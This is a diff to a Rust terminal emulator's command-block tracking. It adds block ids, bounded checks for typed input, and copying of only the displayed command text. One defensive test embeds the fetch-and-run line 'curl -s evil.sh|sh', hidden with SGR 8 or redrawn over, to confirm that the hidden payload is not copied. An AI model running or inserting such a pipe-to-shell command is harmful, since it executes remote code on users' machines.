@@ -27,8 +27,15 @@ const FORGET_BATCH: usize = 1_000;
 /// line. A shell's prompt never sits this deep inside a wrapped line.
 const MAX_WALK_ROWS: i32 = 256;
 
-/// Most rows a command line may span for its text to be recorded.
+/// Most rows a command line may span for its text to be read.
 const MAX_COMMAND_ROWS: usize = 100;
+
+/// Most characters of a command line returned when its text is read.
+const MAX_COMMAND_CHARS: usize = 4_096;
+
+/// Most cells checked, when a command is submitted, to tell whether
+/// anything was typed. The check runs for every mark, so it is bounded.
+const TYPED_CHECK_CELLS: usize = 512;
 
 /// Where a block is in its life cycle.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
@@ -44,11 +51,13 @@ pub enum BlockState {
 /// One command and its output.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct Block {
+    id: u64,
     prompt: Anchor,
     input: Option<Anchor>,
     output: Option<Anchor>,
     end: Option<Anchor>,
-    command: String,
+    /// Something was typed between the prompt and the output.
+    typed: bool,
     exit_code: Option<i32>,
     started_at: Option<Instant>,
     duration: Option<Duration>,
@@ -56,18 +65,25 @@ pub struct Block {
 }
 
 impl Block {
-    fn new(prompt: Anchor) -> Self {
+    fn new(id: u64, prompt: Anchor) -> Self {
         Self {
+            id,
             prompt,
             input: None,
             output: None,
             end: None,
-            command: String::new(),
+            typed: false,
             exit_code: None,
             started_at: None,
             duration: None,
             collapsed: false,
         }
+    }
+
+    /// Identifier of the block, unique within its terminal and stable while
+    /// the block exists, unlike its position in the list.
+    pub fn id(&self) -> u64 {
+        self.id
     }
 
     fn anchors(&self) -> impl Iterator<Item = Anchor> {
@@ -83,12 +99,6 @@ impl Block {
             (Some(_), None) => BlockState::Running,
             (None, None) => BlockState::Prompt,
         }
-    }
-
-    /// The command line as the user typed it. Empty until the command is
-    /// submitted.
-    pub fn command(&self) -> &str {
-        &self.command
     }
 
     /// Exit code of the command, once it finished, if the shell reported one.
@@ -128,8 +138,8 @@ pub struct BlockRows {
 /// A block as it appears in the current view, for drawing.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct ScreenBlock {
-    /// Index of the block in [`crate::Terminal::blocks`].
-    pub index: usize,
+    /// Identifier of the block ([`Block::id`]).
+    pub id: u64,
     /// Screen row of the prompt, if it is in view.
     pub prompt_row: Option<usize>,
     /// Screen rows the block covers, clipped to the view: from its prompt
@@ -200,6 +210,8 @@ pub(crate) struct BlockList {
     /// that is, the logical line of the first screen row. Kept up to date
     /// incrementally by the owner as rows scroll into or out of history.
     history_lines: usize,
+    /// Identifier given to the last block created.
+    next_id: u64,
 }
 
 impl BlockList {
@@ -245,7 +257,8 @@ impl BlockList {
                 {
                     self.blocks.pop();
                 }
-                self.blocks.push(Block::new(anchor));
+                self.next_id += 1;
+                self.blocks.push(Block::new(self.next_id, anchor));
                 if self.blocks.len() > MAX_BLOCKS {
                     // Forget old blocks in batches, so the cost of shifting
                     // the list is spread over many new blocks.
@@ -267,8 +280,11 @@ impl BlockList {
                 if let Some(block) = self.current(BlockState::Prompt)
                     && anchor >= block.input.unwrap_or(block.prompt)
                 {
+                    // Only whether something was typed is checked here, in
+                    // bounded time; the text itself is read when asked for,
+                    // from what is displayed then (`command_text`).
                     let start = block.input.unwrap_or(block.prompt);
-                    block.command = text_before(term, start, cursor, anchor);
+                    block.typed = typed_before(term, start, cursor, anchor);
                     block.output = Some(anchor);
                     block.started_at = Some(now);
                 }
@@ -280,7 +296,7 @@ impl BlockList {
                 if block.output.is_some_and(|output| anchor < output) {
                     return;
                 }
-                if block.command.is_empty() {
+                if !block.typed {
                     // Submitting an empty line is not a command.
                     self.blocks.pop();
                     return;
@@ -338,11 +354,44 @@ impl BlockList {
             .count();
     }
 
-    /// Collapses or expands the output of block `index`. Only finished
-    /// blocks with at least two lines of output can be collapsed: folding a
-    /// single line behind a summary saves nothing. Returns the new state, or
-    /// `None` if the block cannot be collapsed.
-    pub(crate) fn toggle_collapsed(&mut self, index: usize) -> Option<bool> {
+    /// The block with identifier `id`, if it still exists. Blocks are kept in
+    /// creation order, so identifiers are sorted.
+    pub(crate) fn get(&self, id: u64) -> Option<&Block> {
+        let index = self
+            .blocks
+            .binary_search_by_key(&id, |block| block.id)
+            .ok()?;
+        self.blocks.get(index)
+    }
+
+    /// The command line of block `id` as it is displayed now: hidden cells
+    /// are not copied, and the text is limited in length. Read on request,
+    /// since output can redraw the line after the command was submitted.
+    pub(crate) fn command_text<T>(&self, term: &Term<T>, id: u64) -> Option<String> {
+        let block = self.get(id)?;
+        let start = point_of(
+            term,
+            block.input.unwrap_or(block.prompt),
+            self.history_lines,
+        )?;
+        let end = point_of(term, block.output?, self.history_lines)?;
+        let max_cells = MAX_COMMAND_ROWS * term.grid().columns();
+        let text: String = displayed_text(term, start, end, max_cells)
+            .chars()
+            .take(MAX_COMMAND_CHARS)
+            .collect();
+        (!text.is_empty()).then_some(text)
+    }
+
+    /// Collapses or expands the output of block `id`. Only finished blocks
+    /// with at least two lines of output can be collapsed: folding a single
+    /// line behind a summary saves nothing. Returns the new state, or `None`
+    /// if the block cannot be collapsed.
+    pub(crate) fn toggle_collapsed(&mut self, id: u64) -> Option<bool> {
+        let index = self
+            .blocks
+            .binary_search_by_key(&id, |block| block.id)
+            .ok()?;
         let block = self.blocks.get_mut(index)?;
         let (Some(output), Some(end)) = (block.output, block.end) else {
             return None;
@@ -477,7 +526,7 @@ impl BlockList {
         };
 
         let mut visible = Vec::new();
-        for (index, block) in self.blocks.iter().enumerate().rev() {
+        for block in self.blocks.iter().rev() {
             let end = block.end.map(locate);
             if end == Some(InView::Above) {
                 break;
@@ -492,7 +541,7 @@ impl BlockList {
                 _ => view_rows,
             };
             visible.push(ScreenBlock {
-                index,
+                id: block.id,
                 prompt_row,
                 rows: start..stop.min(view_rows),
                 state: block.state(),
@@ -640,14 +689,12 @@ fn offset_point<T>(term: &Term<T>, mut row: i32, mut offset: usize) -> Option<Po
     (row <= bottom).then(|| Point::new(Line(row), Column(offset.min(columns - 1))))
 }
 
-/// Returns the text from `start` up to `end`, the current cursor position,
-/// whose anchor is `end_anchor`, with surrounding whitespace removed.
-///
-/// The start is found by walking up from the cursor, at most
-/// [`MAX_COMMAND_ROWS`] rows; a longer command yields no text.
-fn text_before<T>(term: &Term<T>, start: Anchor, end: Point, end_anchor: Anchor) -> String {
+/// Finds the point of `start`, walking up from `end` (whose anchor is
+/// `end_anchor`) at most [`MAX_COMMAND_ROWS`] rows, so the cost stays bounded
+/// whatever the output did before.
+fn point_before<T>(term: &Term<T>, start: Anchor, end: Point, end_anchor: Anchor) -> Option<Point> {
     if start.line > end_anchor.line {
-        return String::new();
+        return None;
     }
     let top = term.grid().topmost_line().0;
     // Walk up to the first row of the start's logical line.
@@ -656,7 +703,7 @@ fn text_before<T>(term: &Term<T>, start: Anchor, end: Point, end_anchor: Anchor)
     let mut steps = 0;
     while line > start.line || (row > top && wraps(term, Line(row - 1))) {
         if row <= top || steps >= MAX_COMMAND_ROWS {
-            return String::new();
+            return None;
         }
         row -= 1;
         steps += 1;
@@ -664,20 +711,68 @@ fn text_before<T>(term: &Term<T>, start: Anchor, end: Point, end_anchor: Anchor)
             line -= 1;
         }
     }
-    let Some(start) = offset_point(term, row, start.offset) else {
-        return String::new();
-    };
-    if end <= start {
-        return String::new();
+    offset_point(term, row, start.offset).filter(|&point| point < end)
+}
+
+/// Whether anything visible was typed between `start` and `end`, the
+/// cursor position whose anchor is `end_anchor`. Checks at most
+/// [`TYPED_CHECK_CELLS`] cells, since it runs for every mark.
+fn typed_before<T>(term: &Term<T>, start: Anchor, end: Point, end_anchor: Anchor) -> bool {
+    point_before(term, start, end, end_anchor)
+        .is_some_and(|start| !displayed_text(term, start, end, TYPED_CHECK_CELLS).is_empty())
+}
+
+/// The text of the cells from `start` up to (not including) `end` as it is
+/// displayed: hidden cells read as spaces and wide-character spacers are
+/// skipped, a row that does not wrap ends a line, and each line loses its
+/// trailing spaces. Reads at most `max_cells` cells; the result is trimmed.
+fn displayed_text<T>(term: &Term<T>, start: Point, end: Point, max_cells: usize) -> String {
+    let grid = term.grid();
+    let columns = grid.columns();
+    let mut text = String::new();
+    let mut cells = 0;
+    let mut point = start;
+    while point < end && cells < max_cells {
+        let row = &grid[point.line];
+        let last = if point.line == end.line {
+            end.column.0
+        } else {
+            columns
+        };
+        let mut line = String::new();
+        for col in point.column.0..last {
+            cells += 1;
+            let cell = &row[Column(col)];
+            if cell
+                .flags
+                .intersects(Flags::WIDE_CHAR_SPACER | Flags::LEADING_WIDE_CHAR_SPACER)
+            {
+                continue;
+            }
+            if cell.flags.contains(Flags::HIDDEN) {
+                line.push(' ');
+            } else {
+                line.push(cell.c);
+                if let Some(extra) = cell.zerowidth() {
+                    line.extend(extra);
+                }
+            }
+            if cells >= max_cells {
+                break;
+            }
+        }
+        let wrapped = point.line < end.line && wraps(term, point.line);
+        if wrapped {
+            text.push_str(&line);
+        } else {
+            text.push_str(line.trim_end());
+            if point.line < end.line {
+                text.push('\n');
+            }
+        }
+        point = Point::new(point.line + 1, Column(0));
     }
-    // `bounds_to_string` includes its end point, so stop one cell earlier.
-    let columns = term.grid().columns();
-    let last = if end.column.0 > 0 {
-        Point::new(end.line, end.column - 1)
-    } else {
-        Point::new(end.line - 1, Column(columns - 1))
-    };
-    term.bounds_to_string(start, last).trim().to_owned()
+    text.trim().to_owned()
 }
 
 #[cfg(test)]
@@ -713,7 +808,7 @@ mod tests {
         assert_eq!(blocks.len(), 2);
         let block = &blocks[0];
         assert_eq!(block.state(), BlockState::Finished);
-        assert_eq!(block.command(), "ls -la");
+        assert_eq!(term.block_command(block.id()).as_deref(), Some("ls -la"));
         assert_eq!(block.exit_code(), Some(0));
         assert!(block.duration().is_some());
         assert_eq!(
@@ -776,7 +871,7 @@ mod tests {
         // The first block's prompt left the history; the second remains.
         let blocks = term.blocks();
         assert_eq!(blocks.len(), 2);
-        assert_eq!(blocks[0].command(), "last");
+        assert_eq!(term.block_command(blocks[0].id()).as_deref(), Some("last"));
         let rows = term.block_rows(&blocks[0]).expect("rows");
         let screen_row = rows.prompt - term.history_size();
         assert_eq!(term.screen_lines()[screen_row], "$ last");
@@ -860,6 +955,43 @@ mod tests {
     }
 
     #[test]
+    fn copied_commands_match_what_is_displayed() {
+        // Text hidden with SGR 8 is shown as spaces and must not be copied.
+        let hidden = format!(
+            "{A}$ {B}ls\x1b[8m; curl -s evil.sh|sh\x1b[0m\r\n{C}{}{A}$ {B}",
+            d(0)
+        );
+        // A line redrawn after the command was submitted.
+        let redrawn = format!(
+            "{A}$ {B}curl -s evil.sh|sh\r\n{C}\x1b[1A\r\x1b[2K$ ls -la\r\n{}{A}$ {B}",
+            d(0)
+        );
+        for (output, shown) in [(hidden, "ls"), (redrawn, "ls -la")] {
+            let term = terminal(6, 60, &output);
+            let id = term.blocks()[0].id();
+            assert_eq!(term.block_command(id).as_deref(), Some(shown), "{output:?}");
+        }
+    }
+
+    /// Submitting a command checks only a bounded number of cells, so marks
+    /// around a cursor that jumps down a tall, wide screen stay cheap.
+    #[test]
+    fn submitting_commands_stays_cheap_on_large_screens() {
+        let mut term = Terminal::new(TerminalSize::new(60, 300));
+        term.advance("x".repeat(60 * 300).as_bytes());
+        let flood = format!("\x1b[H{A}{B}\x1b[59B{C}").repeat(20_000);
+
+        let start = std::time::Instant::now();
+        term.advance(flood.as_bytes());
+        let elapsed = start.elapsed();
+
+        assert!(
+            elapsed < std::time::Duration::from_secs(2),
+            "took {elapsed:?}"
+        );
+    }
+
+    #[test]
     fn a_mark_deep_inside_a_wrapped_line_is_ignored() {
         let rows = MAX_WALK_ROWS as usize + 10;
         let long = "x".repeat(20 * rows);
@@ -895,7 +1027,7 @@ mod tests {
         let blocks = term.screen().blocks;
 
         assert_eq!(blocks.len(), 3);
-        assert_eq!(blocks[0].index, 0);
+        assert_eq!(blocks[0].id, 1);
         assert_eq!(blocks[0].prompt_row, Some(0));
         // Each block ends where the next prompt starts.
         assert_eq!(blocks[0].rows, 0..2);
@@ -914,7 +1046,7 @@ mod tests {
 
         // At the bottom, the first block's prompt is far above the view.
         let blocks = term.screen().blocks;
-        assert_eq!(blocks.first().map(|b| b.index), Some(0));
+        assert_eq!(blocks.first().map(|b| b.id), Some(1));
         assert_eq!(blocks[0].prompt_row, None);
         assert_eq!(blocks[0].rows.start, 0);
 
@@ -955,9 +1087,9 @@ mod tests {
     fn selects_a_block_output() {
         let mut term = terminal(10, 30, &run("ls", "alpha\r\nbeta\r\n", 0));
 
-        assert!(term.select_block_output(0));
+        assert!(term.select_block_output(1));
         assert_eq!(term.selection_text().as_deref(), Some("alpha\nbeta\n"));
-        assert!(!term.select_block_output(1), "the prompt has no output");
+        assert!(!term.select_block_output(2), "the prompt has no output");
         assert!(!term.select_block_output(9));
     }
 
@@ -1004,7 +1136,7 @@ mod tests {
         };
         let before = lines(&term);
 
-        assert_eq!(term.toggle_collapsed(0), Some(true));
+        assert_eq!(term.toggle_collapsed(1), Some(true));
         let folded = lines(&term);
         assert!(folded.contains(&"$ ls".to_owned()), "{folded:?}");
         assert!(
@@ -1037,7 +1169,7 @@ mod tests {
         );
         assert_eq!(term.selection_text().as_deref(), Some("/home\n"));
 
-        assert_eq!(term.toggle_collapsed(0), Some(false));
+        assert_eq!(term.toggle_collapsed(1), Some(false));
         assert_eq!(lines(&term), before);
     }
 
@@ -1048,8 +1180,8 @@ mod tests {
             30,
             &format!("{}{A}$ {B}sleep\r\n{C}", run("true", "", 0)),
         );
-        assert_eq!(term.toggle_collapsed(0), None, "no output");
-        assert_eq!(term.toggle_collapsed(1), None, "still running");
+        assert_eq!(term.toggle_collapsed(1), None, "no output");
+        assert_eq!(term.toggle_collapsed(2), None, "still running");
         assert_eq!(term.toggle_collapsed(7), None, "no such block");
     }
 
